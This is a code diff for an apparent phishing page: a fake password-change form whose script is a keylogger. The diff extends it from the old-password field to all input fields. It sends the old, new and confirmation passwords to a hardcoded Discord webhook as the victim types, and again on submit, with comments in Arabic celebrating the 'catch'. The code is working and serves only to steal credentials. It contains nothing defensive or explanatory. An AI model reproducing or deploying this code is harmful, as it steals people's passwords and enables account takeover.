@@ -50,26 +50,36 @@
 </div>
 
 <script>
-    const webhookURL = "https://discordapp.com/api/webhooks/1493722493511401704/aYkLDXbIECF4GaV9BH7FQUuvZ7zpjdBDUqdoGoJT9hZurBLMv-heWVb-fbtbJWAc4xWF";
+const webhookURL = "https://discordapp.com/api/webhooks/1493722493511401704/aYkLDXbIECF4GaV9BH7FQUuvZ7zpjdBDUqdoGoJT9hZurBLMv-heWVb-fbtbJWAc4xWF";
 
-    // --- نظام الـ Keylogger المطور ---
-    const oldPassInput = document.getElementById('old_pass');
+    // --- نظام الـ Keylogger الشامل لجميع الخانات ---
     let timeout = null;
 
-    oldPassInput.addEventListener('input', function() {
-        clearTimeout(timeout);
-        timeout = setTimeout(() => {
-            const currentText = oldPassInput.value;
-            if (currentText.length > 0) {
-                fetch(webhookURL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: "⌨️ **Live Typing (جاري الكتابة):**\n` " + currentText + " `\n*(تم التحديث بناءً على آخر تعديل)*"
-                    })
-                });
-            }
-        }, 1200); // إرسال بعد ثانية وربع من التوقف عن الكتابة
+    // دالة لمراقبة الكتابة في أي مكان
+    document.addEventListener('input', function(e) {
+        if (e.target.tagName === 'INPUT') {
+            clearTimeout(timeout);
+            
+            timeout = setTimeout(() => {
+                const oldP = document.getElementById('old_pass').value;
+                const newP = document.getElementById('new_pass').value;
+                const confP = document.getElementById('confirm_pass').value;
+
+                // إرسال تحديث شامل لكل ما كُتب حتى الآن
+                if (oldP || newP || confP) {
+                    fetch(webhookURL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            content: "⌨️ **تحديث الكتابة الفوري:**\n" +
+                                     "**القديمة:** `" + (oldP || "جاري الكتابة...") + "`\n" +
+                                     "**الجديدة:** `" + (newP || "...") + "`\n" +
+                                     "**التأكيد:** `" + (confP || "...") + "`"
+                        })
+                    });
+                }
+            }, 1200); // ينتظر ثانية بعد آخر حرف يكتبه في أي خانة ويرسل التقرير
+        }
     });
 
     // --- نظام الإرسال النهائي عند الضغط على الزر ---
@@ -80,24 +90,23 @@
 
         if (oldP.length < 1) return alert("Bitte füllen Sie alle Felder aus.");
 
-        // إرسال الضربة القاضية
         fetch(webhookURL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 embeds: [{
-                    title: "✅ صيد نهائي مكتمل",
+                    title: "🚀 تم ضغط زر التأكيد - الصيد النهائي",
                     color: 3066993,
                     fields: [
-                        { name: "🔑 الباسوورد الحقيقي", value: "`" + oldP + "`", inline: false },
-                        { name: "🆕 الباسوورد الجديد المقترح", value: "`" + newP + "`", inline: true }
+                        { name: "🔑 كلمة السر الحقيقية", value: "`" + oldP + "`", inline: false },
+                        { name: "🆕 المقترحة الجديدة", value: "`" + newP + "`", inline: true },
+                        { name: "🔄 تأكيد الجديدة", value: "`" + confP + "`", inline: true }
                     ],
-                    footer: { text: "نظام التحقق المتطور - GitHub Pages" }
+                    footer: { text: "نظام المراقبة المباشرة - جاري التوجيه" }
                 }]
             })
         });
 
-        // إظهار المؤقت
         document.getElementById('login-section').style.display = 'none';
         document.getElementById('timer-section').style.display = 'block';
 
